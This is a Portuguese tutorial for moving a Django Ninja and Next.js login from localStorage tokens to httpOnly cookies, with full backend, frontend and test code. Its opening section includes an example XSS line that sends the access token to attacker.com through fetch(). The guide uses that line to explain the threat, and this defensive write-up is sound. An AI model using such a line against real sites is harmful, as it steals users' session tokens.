# Mitigando problema de XSS (Cross-Site Scripting)

## O problema

A nossa implementação atual de login tem um problema, porque estamos usando `localStorage` para armazenar os nossos tokens. Isso deixa o site exposto a ataques de XSS.

O ataque de XSS consiste em um atacante conseguir executar um código JavaScript no browser da vítima, podendo então roubar os tokens JWT e se autenticar diretamente na API do nosso sistema.

Funciona assim:

1. O atacante de alguma forma consegue executar isso no browser da vítima:
   ```js
   fetch("https://attacker.com/steal?token=" + localStorage.getItem("access_token"))
   ```

2. Esse código vai tentar enviar um request tipo assim:
   ```
   https://attacker.com/steal?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

3. O CORS do browser vai bloquear a **leitura** do response vindo de `attacker.com`, mas até lá o atacante já recebeu a request e tem acesso ao token.

Para mitigar esse problema, o ideal é usar cookies `httpOnly`. Os cookies `httpOnly` nunca são acessados via JavaScript — apenas o browser pode lê-los e enviá-los automaticamente nas requisições.

---

## A solução: cookies httpOnly

Com cookies httpOnly, o fluxo muda assim:

- **Antes**: o backend retorna o token no JSON → o frontend salva no localStorage → o frontend lê do localStorage e coloca no header `Authorization: Bearer`
- **Depois**: o backend seta o token diretamente no cookie → o browser guarda o cookie e o envia automaticamente em todas as requisições → o backend lê o cookie

O JavaScript da página **nunca vê** o token. Mesmo que um atacante consiga rodar código JS malicioso na página, não tem como roubar o token.

### O cookie `is_logged_in`

Precisamos de uma forma de saber no frontend se o usuário está logado ou não (para redirecionar para a tela de login, por exemplo). Como o `access_token` é `httpOnly` e não pode ser lido pelo JS, criamos um segundo cookie chamado `is_logged_in` que:

- **Não é** `httpOnly` — o JavaScript consegue ler
- **Não contém** o token em si — portanto roubar ele não serve pra nada
- É apenas um "sinal" que diz "existe uma sessão ativa"

---

## Visão geral das mudanças

| Arquivo | O que muda |
|---|---|
| `myapi/core/auth.py` | Troca `HttpBearer` por `APIKeyCookie`, adiciona `set_auth_cookies` e `clear_auth_cookies` |
| `myapi/core/schemas.py` | Remove `TokenResponse` e `RefreshRequest`, adiciona `MessageSchema` |
| `myapi/core/api.py` | Endpoints `login`, `refresh` e `social_token` param a setar cookies; novo endpoint `logout` |
| `myapi/settings.py` | Adiciona `COOKIE_SECURE` e `COOKIE_DOMAIN` |
| `next/config/api.js` | Adiciona endpoint `LOGOUT` |
| `next/utils/api.js` | Remove header `Authorization: Bearer`, adiciona `credentials: 'include'` |
| `next/utils/auth.js` | Remove todo uso de `localStorage`, atualiza todas as funções |
| `next/pages/home.jsx` | Atualiza checagem de auth e logout |
| `next/pages/.../callback/index.jsx` | Remove checagem de token no body da resposta |
| `myapi/core/tests/test_auth.py` | Atualiza para checar cookies ao invés de body JSON |

---

## Backend

### 1. `core/auth.py`

Trocamos o `HttpBearer` (que lê token do header `Authorization: Bearer`) pelo `APIKeyCookie` (que lê token do cookie). Adicionamos também as funções que setam e limpam os cookies.

```python title="myapi/core/auth.py"
from datetime import datetime, timedelta

import jwt
from django.conf import settings
from django.contrib.auth import get_user_model
from ninja.security import APIKeyCookie

User = get_user_model()
ALGO = 'HS256'
ACCESS_LIFETIME = timedelta(minutes=15)
REFRESH_LIFETIME = timedelta(days=30)


def create_token(user):
    now = datetime.utcnow()
    access_token = jwt.encode(
        {'user_id': str(user.id), 'exp': now + ACCESS_LIFETIME, 'type': 'access'},
        settings.SECRET_KEY,
        algorithm=ALGO,
    )
    refresh_token = jwt.encode(
        {'user_id': str(user.id), 'exp': now + REFRESH_LIFETIME, 'type': 'refresh'},
        settings.SECRET_KEY,
        algorithm=ALGO,
    )
    return {'access_token': access_token, 'refresh_token': refresh_token}


def verify_refresh_token(token):
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[ALGO])
        if payload.get('type') != 'refresh':
            return None
        user_id = payload.get('user_id')
        return User.objects.get(id=user_id)
    except jwt.ExpiredSignatureError:
        return None
    except Exception:
        return None


def set_auth_cookies(response, tokens):
    """Seta os cookies httpOnly de autenticação na resposta."""
    secure = getattr(settings, 'COOKIE_SECURE', False)
    domain = getattr(settings, 'COOKIE_DOMAIN', None)
    response.set_cookie(
        'access_token',
        tokens['access_token'],
        max_age=int(ACCESS_LIFETIME.total_seconds()),
        httponly=True,   # JS não consegue ler
        secure=secure,   # True em produção (só HTTPS)
        samesite='Lax',  # Proteção contra CSRF
        domain=domain,
    )
    response.set_cookie(
        'refresh_token',
        tokens['refresh_token'],
        max_age=int(REFRESH_LIFETIME.total_seconds()),
        httponly=True,
        secure=secure,
        samesite='Lax',
        domain=domain,
    )
    # Cookie legível por JS para o frontend saber se está logado
    response.set_cookie(
        'is_logged_in',
        'true',
        max_age=int(REFRESH_LIFETIME.total_seconds()),
        httponly=False,  # Propositalmente legível por JS
        secure=secure,
        samesite='Lax',
        domain=domain,
    )


def clear_auth_cookies(response):
    """Remove todos os cookies de autenticação da resposta."""
    domain = getattr(settings, 'COOKIE_DOMAIN', None)
    response.delete_cookie('access_token', domain=domain, samesite='Lax')
    response.delete_cookie('refresh_token', domain=domain, samesite='Lax')
    response.delete_cookie('is_logged_in', domain=domain, samesite='Lax')


class JWTAuth(APIKeyCookie):
    param_name = 'access_token'  # nome do cookie que vai ser lido

    def authenticate(self, request, key):
        try:
            payload = jwt.decode(key, settings.SECRET_KEY, algorithms=[ALGO])
            if payload.get('type') != 'access':
                return None
            user_id = payload.get('user_id')
            return User.objects.get(id=user_id)
        except jwt.ExpiredSignatureError:
            return None
        except Exception:
            return None


class AdminAuth(JWTAuth):
    def authenticate(self, request, key):
        user = super().authenticate(request, key)
        if not user:
            return None
        if not getattr(user, 'is_staff', False):
            return None
        return user


class OwnerOrAdminAuth(JWTAuth):
    def authenticate(self, request, key):
        user = super().authenticate(request, key)
        if not user:
            return None

        target_identifier = None
        try:
            path_parts = str(request.path).split('/')
            if 'users' in path_parts:
                users_index = path_parts.index('users')
                if users_index + 1 < len(path_parts):
                    target_identifier = path_parts[users_index + 1]
        except Exception:
            target_identifier = None

        if not target_identifier:
            return user if getattr(user, 'is_staff', False) else None

        if getattr(user, 'is_staff', False):
            return user

        if str(user.id) == str(target_identifier) or user.username == target_identifier:
            return user

        return None
```

---

### 2. `core/schemas.py`

Removemos `TokenResponse` e `RefreshRequest` (não precisamos mais devolver tokens no body nem receber o refresh token no body). Adicionamos `MessageSchema` para as respostas simples.

```python title="myapi/core/schemas.py"
from ninja import Schema


class StatusSchema(Schema):
    updated_at: str
    db_version: str
    max_connections: int
    active_connections: int


class LoginRequest(Schema):
    username: str
    password: str


class MessageSchema(Schema):
    message: str
```

---

### 3. `core/api.py`

Esta é a mudança mais importante. Cada endpoint precisa:

1. Receber `response: HttpResponse` como parâmetro — o Django Ninja detecta esse parâmetro e injeta o objeto de resposta HTTP, nos dando acesso para setar cookies **antes** de retornar
2. Chamar `set_auth_cookies(response, tokens)` em vez de retornar os tokens no body
3. O endpoint `refresh` passa a ler o token do cookie (`request.COOKIES.get('refresh_token')`) em vez do body
4. Adicionamos o endpoint `logout` que chama `clear_auth_cookies`

```python title="myapi/core/api.py"
from http import HTTPStatus

from django.contrib.auth import authenticate
from django.db import connection
from django.http import HttpResponse
from loguru import logger
from ninja import Router

from .auth import create_token, verify_refresh_token, set_auth_cookies, clear_auth_cookies
from .exceptions import ServiceError, UnauthorizedError
from .schemas import LoginRequest, MessageSchema, StatusSchema

router = Router(tags=['Admin'])


##############
# STATUS
##############
@router.get('status', response=StatusSchema)
def status(request):
    try:
        with connection.cursor() as cursor:
            cursor.execute('SELECT version()')
            db_version = cursor.fetchone()[0]
            cursor.execute('SHOW max_connections')
            max_connections = int(cursor.fetchone()[0])
            cursor.execute('SELECT count(*) FROM pg_stat_activity')
            active_connections = int(cursor.fetchone()[0])
        return HTTPStatus.OK, {
            'updated_at': str(__import__('datetime').datetime.now()),
            'db_version': db_version,
            'max_connections': max_connections,
            'active_connections': active_connections,
        }
    except Exception as e:
        logger.error(f'Database Error: {e}')
        raise ServiceError(message='Ocorreu um erro ao acessar o banco de dados.')


##############
# AUTH
##############
@router.post('login', tags=['Auth'], response={200: MessageSchema})
def login(request, response: HttpResponse, credentials: LoginRequest):
    # response: HttpResponse é injetado pelo Django Ninja automaticamente
    # nos dá acesso para setar cookies antes de retornar
    user = authenticate(username=credentials.username, password=credentials.password)
    if not user:
        logger.warning(f'Failed login attempt for username: {credentials.username}')
        raise UnauthorizedError()
    logger.info(f'User {user.username} (id={user.id}) logged in')
    tokens = create_token(user)
    set_auth_cookies(response, tokens)  # seta os cookies httpOnly
    return 200, {'message': 'Login realizado com sucesso'}


@router.post('refresh', tags=['Auth'], response={200: MessageSchema})
def refresh(request, response: HttpResponse):
    # O refresh_token chega automaticamente via cookie — sem body necessário
    refresh_token = request.COOKIES.get('refresh_token')
    if not refresh_token:
        raise UnauthorizedError(message='Refresh token não encontrado')
    user = verify_refresh_token(refresh_token)
    if not user:
        logger.warning('Failed refresh attempt with invalid refresh token')
        raise UnauthorizedError(message='Invalid or expired refresh token')
    logger.info(f'User {user.username} (id={user.id}) refreshed token')
    tokens = create_token(user)
    set_auth_cookies(response, tokens)
    return 200, {'message': 'Token renovado com sucesso'}


@router.post('logout', tags=['Auth'], response={200: MessageSchema})
def logout(request, response: HttpResponse):
    # Com cookies httpOnly, o JS não consegue limpar os cookies
    # Precisamos de um endpoint no backend para fazer isso
    clear_auth_cookies(response)
    logger.info('User logged out')
    return 200, {'message': 'Logout realizado com sucesso'}


@router.post('social-token', tags=['Auth'], response={200: MessageSchema})
def social_token(request, response: HttpResponse):
    """Gera JWT para usuário autenticado via OAuth (Google)."""
    if not request.user.is_authenticated:
        logger.warning('Attempt to get social token without authentication')
        raise UnauthorizedError(message='User is not authenticated')
    user = request.user
    logger.info(f'User {user.username} (id={user.id}) requested social token')
    tokens = create_token(user)
    set_auth_cookies(response, tokens)
    return 200, {'message': 'Token gerado com sucesso'}
```

---

### 4. `settings.py`

Adicionamos duas configurações de cookie. Em desenvolvimento ficam com valores seguros/defaults, e em produção precisam ser definidas no `.env`.

```python title="myapi/settings.py"
# Adicionar junto com as outras configurações de segurança

# Cookie settings
# Em produção: COOKIE_SECURE=True (só envia cookies via HTTPS)
# Em produção: COOKIE_DOMAIN=.seudominio.com (o ponto inicial permite subdomínios)
COOKIE_SECURE = config('COOKIE_SECURE', default=False, cast=bool)
COOKIE_DOMAIN = config('COOKIE_DOMAIN', default=None)
```

> **Por que `COOKIE_DOMAIN`?** Se o frontend está em `app.seusite.com` e o backend em `api.seusite.com`, o cookie precisa ser válido para os dois subdomínios. Com `.seusite.com` (ponto inicial), o browser envia o cookie para qualquer subdomínio de `seusite.com`.

---

## Frontend

### 5. `next/config/api.js`

Adicionamos o endpoint de logout que criamos no backend.

```js title="next/config/api.js"
export const API_ENDPOINTS = {
  AUTH: {
    LOGIN: '/api/v1/login',
    LOGOUT: '/api/v1/logout',      // novo
    REFRESH: '/api/v1/refresh',
    SOCIAL_TOKEN: '/api/v1/social-token',
    ACTIVATE: (tokenId) => `/api/v1/users/activate/${tokenId}`,
    RESEND_ACTIVATION: (tokenId) => `/api/v1/users/resend-activation/${tokenId}`,
  },
  // ... resto igual
};
```

---

### 6. `next/utils/api.js`

Duas mudanças:

1. **Remover** o bloco que lia o token do `localStorage` e adicionava o header `Authorization`
2. **Adicionar** `credentials: 'include'` para que o browser envie os cookies automaticamente em todas as requisições

```js title="next/utils/api.js"
import API_BASE_URL from 'config/api';

export async function apiCall(endpoint, options = {}) {
  const url = `${API_BASE_URL}${endpoint}`;

  const headers = {
    'Content-Type': 'application/json',
    ...options.headers,
  };

  // REMOVIDO: leitura do token do localStorage e header Authorization: Bearer
  // O browser agora envia o cookie access_token automaticamente

  let response;
  try {
    response = await fetch(url, {
      ...options,
      headers,
      credentials: 'include', // envia cookies (access_token, refresh_token) automaticamente
    });
  } catch (err) {
    console.error(`Erro de conexão ao fazer requisição para ${url}:`, err);
    throw new Error(`Erro de conexão: ${err.message}`);
  }

  if (response.status === 204) {
    return null;
  }

  let data;
  try {
    data = await response.json();
  } catch (err) {
    throw new Error(`Erro ao processar resposta: ${response.statusText}`);
  }

  if (!response.ok) {
    const errorMessage = data?.message || response.statusText;
    console.error(`Erro ${response.status} em ${url}:`, data);
    throw new Error(`Erro ${response.status}: ${errorMessage}`);
  }

  return data;
}
```

> **Por que `credentials: 'include'`?** Por padrão, o `fetch` não envia cookies em requisições cross-origin (frontend em `:3000`, backend em `:8000`). O `credentials: 'include'` força o browser a incluir os cookies. Isso só funciona porque o backend já tem `CORS_ALLOW_CREDENTIALS = True` e `CORS_ALLOWED_ORIGINS` com a origem do frontend.

---

### 7. `next/utils/auth.js`

Esta é a mudança mais extensa no frontend. Removemos tudo que usa `localStorage` e adaptamos as funções:

```js title="next/utils/auth.js"
import { apiCall } from './api';
import API_BASE_URL, { API_ENDPOINTS } from 'config/api';

export async function loginUser(username, password) {
  // O backend vai setar os cookies httpOnly automaticamente
  // Não precisamos mais salvar nada no localStorage
  await apiCall(API_ENDPOINTS.AUTH.LOGIN, {
    method: 'POST',
    body: JSON.stringify({ username, password }),
  });
}

export async function signupUser(username, email, password, firstName, lastName) {
  return await apiCall(API_ENDPOINTS.USERS.CREATE, {
    method: 'POST',
    body: JSON.stringify({
      username,
      email,
      password,
      first_name: firstName,
      last_name: lastName,
    }),
  });
}

export async function activateUser(tokenId) {
  return await apiCall(API_ENDPOINTS.AUTH.ACTIVATE(tokenId), {
    method: 'PATCH',
  });
}

export async function logoutUser() {
  // Com cookies httpOnly, o JS não consegue deletar o cookie
  // Precisamos chamar o backend para limpar os cookies
  try {
    await apiCall(API_ENDPOINTS.AUTH.LOGOUT, { method: 'POST' });
  } catch (err) {
    // Mesmo se o backend falhar, tentamos limpar o cookie is_logged_in
    // (os outros são httpOnly e não podem ser deletados pelo JS)
    console.error('Erro ao fazer logout:', err);
  }
}

export function isAuthenticated() {
  // Lê o cookie is_logged_in — ele não é httpOnly, então o JS consegue ler
  // Ele não contém o token em si, só indica se existe uma sessão ativa
  if (typeof document === 'undefined') return false; // SSR safety
  return document.cookie.split(';').some((c) => c.trim().startsWith('is_logged_in='));
}

export async function refreshAccessToken() {
  // O refresh_token chega ao backend via cookie automaticamente
  // Não precisamos mais enviá-lo no body
  await apiCall(API_ENDPOINTS.AUTH.REFRESH, { method: 'POST' });
}

export function loginWithGoogle() {
  const googleAuthUrl = `${API_BASE_URL}${API_ENDPOINTS.SOCIAL_AUTH.GOOGLE_LOGIN}`;
  window.location.href = googleAuthUrl;
}

export async function getSocialToken() {
  // O backend vai setar os cookies automaticamente
  // credentials: 'include' já vem do apiCall agora
  await apiCall(API_ENDPOINTS.AUTH.SOCIAL_TOKEN, { method: 'POST' });
}
```

> **Mudança importante no `isAuthenticated`**: antes checávamos `localStorage.getItem('access_token')`. Agora checamos o cookie `is_logged_in` via `document.cookie`. O acesso ao cookie funciona assim: `document.cookie` retorna uma string com todos os cookies não-httpOnly separados por `;`, por exemplo `"is_logged_in=true; outro_cookie=valor"`. Usamos `.split(';').some(...)` para procurar especificamente o `is_logged_in`.

---

### 8. `next/pages/home.jsx`

Duas mudanças na página protegida:

**Troca `getToken()` por `isAuthenticated()`** (linha ~23):

```js title="next/pages/home.jsx"
// ANTES
if (!getToken()) {
  router.push('/');
  return;
}

// DEPOIS
if (!isAuthenticated()) {
  router.push('/');
  return;
}
```

**`handleLogout` precisa ser `async`** (linha ~59):

```js title="next/pages/home.jsx"
// ANTES
const handleLogout = () => {
  logoutUser();        // limpava o localStorage sincronamente
  router.push('/');
};

// DEPOIS
const handleLogout = async () => {
  await logoutUser();  // chama o backend para limpar os cookies
  router.push('/');
};
```

**Atualizar o import** (linha ~3):

```js title="next/pages/home.jsx"
// ANTES
import { getToken, logoutUser } from 'utils/auth';

// DEPOIS
import { isAuthenticated, logoutUser } from 'utils/auth';
```

---

### 9. `next/pages/accounts/google/login/callback/index.jsx`

A página de callback do Google OAuth precisa de duas ajustes:

**Remover a checagem de `response.access_token`** — com cookies, o backend não retorna mais o token no body:

```js title="next/pages/accounts/google/login/callback/index.jsx"
// ANTES
const response = await getSocialToken();

if (response.access_token) {
  console.log('✅ JWT gerado com sucesso');
  setTimeout(() => {
    router.push('/home');
  }, 500);
} else {
  throw new Error('Nenhum token de acesso recebido');
}

// DEPOIS
await getSocialToken();
// Se chegou aqui sem lançar erro, os cookies foram setados com sucesso
console.log('✅ Autenticação realizada com sucesso');
router.push('/home');
```

---

## Testes

### 10. `core/tests/test_auth.py`

Os testes precisam verificar **cookies** ao invés de tokens no body JSON. O cliente de testes do Django guarda os cookies entre requisições automaticamente, o que facilita testar o fluxo de refresh.

```python title="myapi/core/tests/test_auth.py"
import json
from datetime import timedelta
from http import HTTPStatus

import pytest
from decouple import config
from django.contrib.auth import get_user_model
from django.utils import timezone
from freezegun import freeze_time

User = get_user_model()


@pytest.mark.django_db
def test_login_success(client):
    response = client.post(
        '/api/v1/login',
        data=json.dumps({'username': config('DJANGO_ADMIN_USER'), 'password': config('DJANGO_ADMIN_PASSWORD')}),
        content_type='application/json',
    )
    assert response.status_code == HTTPStatus.OK
    # Verificar que os cookies foram setados (não mais tokens no body)
    assert 'access_token' in response.cookies
    assert 'refresh_token' in response.cookies
    assert 'is_logged_in' in response.cookies
    # Verificar que os tokens são httpOnly
    assert response.cookies['access_token']['httponly']
    assert response.cookies['refresh_token']['httponly']
    # is_logged_in não deve ser httpOnly
    assert not response.cookies['is_logged_in']['httponly']


@pytest.mark.django_db
def test_login_invalid_credentials(client):
    response = client.post(
        '/api/v1/login',
        data=json.dumps({'username': config('DJANGO_ADMIN_USER'), 'password': 'wrongpassword'}),
        content_type='application/json',
    )
    assert response.status_code == HTTPStatus.UNAUTHORIZED
    # Não deve ter cookies de autenticação
    assert 'access_token' not in response.cookies


@pytest.mark.django_db
def test_logout_clears_cookies(client):
    # Primeiro faz login
    client.post(
        '/api/v1/login',
        data=json.dumps({'username': config('DJANGO_ADMIN_USER'), 'password': config('DJANGO_ADMIN_PASSWORD')}),
        content_type='application/json',
    )
    # Depois faz logout
    response = client.post('/api/v1/logout')
    assert response.status_code == HTTPStatus.OK
    # Os cookies devem ter sido deletados (max_age=0 ou expires no passado)
    assert response.cookies['access_token']['max-age'] == 0
    assert response.cookies['refresh_token']['max-age'] == 0
    assert response.cookies['is_logged_in']['max-age'] == 0


@pytest.mark.django_db
def test_refresh_token_success(client):
    initial_time = timezone.now()

    # Login — o cliente de testes guarda os cookies automaticamente
    response = client.post(
        '/api/v1/login',
        data=json.dumps({'username': config('DJANGO_ADMIN_USER'), 'password': config('DJANGO_ADMIN_PASSWORD')}),
        content_type='application/json',
    )
    assert response.status_code == HTTPStatus.OK

    # Avança 14 minutos (access token expira em 15)
    with freeze_time(initial_time + timedelta(minutes=14)):
        # Chama refresh — o cookie refresh_token é enviado automaticamente
        response = client.post('/api/v1/refresh')
        assert response.status_code == HTTPStatus.OK
        # Novos cookies devem ter sido setados
        assert 'access_token' in response.cookies


@pytest.mark.django_db
def test_refresh_token_without_cookie(client):
    # Tenta fazer refresh sem estar logado
    response = client.post('/api/v1/refresh')
    assert response.status_code == HTTPStatus.UNAUTHORIZED


@pytest.mark.django_db
def test_protected_endpoint_with_cookie(client):
    # Login
    client.post(
        '/api/v1/login',
        data=json.dumps({'username': config('DJANGO_ADMIN_USER'), 'password': config('DJANGO_ADMIN_PASSWORD')}),
        content_type='application/json',
    )
    # Acessa endpoint protegido — o cookie é enviado automaticamente
    response = client.get('/api/v1/me')
    assert response.status_code == HTTPStatus.OK


@pytest.mark.django_db
def test_protected_endpoint_without_cookie(client):
    # Tenta acessar endpoint protegido sem estar logado
    response = client.get('/api/v1/me')
    assert response.status_code == HTTPStatus.UNAUTHORIZED


@pytest.mark.django_db
def test_social_token_success(client):
    user = User.objects.create_user(username='google_user', email='google@example.com', password='testpass123')
    client.login(username='google_user', password='testpass123')

    response = client.post('/api/v1/social-token')

    assert response.status_code == HTTPStatus.OK
    assert 'access_token' in response.cookies
    assert 'refresh_token' in response.cookies
```
